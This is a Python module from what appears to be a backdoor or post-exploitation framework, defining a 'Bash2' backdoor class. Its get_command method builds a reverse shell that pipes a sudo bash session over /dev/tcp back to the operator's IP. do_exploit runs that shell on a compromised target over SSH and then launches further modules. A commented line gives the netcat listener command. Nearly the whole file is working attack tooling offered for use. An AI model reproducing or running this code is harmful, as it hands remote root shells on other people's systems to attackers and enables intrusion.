from backdoors.backdoor import *
import subprocess
import threading

class Bash2(Backdoor):
    prompt = Fore.RED + "(bash2) " + Fore.BLUE + ">> " + Fore.RESET

    def __init__(self, core):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using second Bash module..."
        self.core = core
        self.options = {
                "port"   : Option("port", 53923, "port to connect to", True),
                }
        self.allow_modules = True
        self.modules = {} 
        self.help_text = INFO + "A slightly different (and more reliable) version of the other bash backdoor."
    
    def get_command(self):
        #return "echo " + self.core.curtarget.pword + " | sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; bash <&196 >&196 2>&196" % self.get_value("port")
        return "sudo -S nohup 0<&196;exec 196<>/dev/tcp/" + self.core.localIP + "/%s; sudo -S bash <&196 >&196 2>&196" % self.get_value("port")
    
    #def do_spawn(self, args): #newline cannot be sent
    #    if(hasattr(self, "child")):
    #        if(self.child.isalive()):
    #            print("Press Control + ] to exit the shell.")
   # 
    #            self.child.interact(escape_character='\x1d', input_filter=None, output_filter=None)
     #       else:
      #          print("The connection has been lost.")
      #  else:
      #      print("The exploit has not been run yet or does not support the interpreter.")

    def do_exploit(self, args):
        port = self.get_value("port")
        target = self.core.curtarget
        print(GOOD + "Initializing backdoor...")
        #input("Run the following command: nc -vnlp %s in another shell to start the listener." % port)
        self.listen(target.pword, "none")
        target.ssh.exec_command(self.get_command())

        for mod in self.modules.keys():
            print(INFO + "Attempting to execute " + mod.name + " module...")
            mod.exploit()
